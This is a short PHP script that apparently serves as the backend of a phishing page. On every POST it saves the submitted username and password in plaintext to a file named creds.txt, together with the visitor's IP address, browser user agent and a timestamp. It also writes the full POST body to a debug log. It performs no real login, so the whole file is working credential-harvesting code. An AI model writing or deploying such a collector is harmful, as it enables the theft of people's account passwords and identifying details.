<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Ensure data directory exists
    $dataDir = '/app/data';
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0755, true);
    }
    
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $timestamp = date('Y-m-d H:i:s');
    
    $entry = "[$timestamp] IP: $ip | UA: $ua | User: $username | Pass: $password\n";
    file_put_contents("$dataDir/creds.txt", $entry, FILE_APPEND | LOCK_EX);
    
    // Debug log
    file_put_contents("$dataDir/debug.log", date('Y-m-d H:i:s') . " POST: " . json_encode($_POST) . "\n", FILE_APPEND | LOCK_EX);
    
    http_response_code(200);
    echo 'OK';
    exit;
}
?>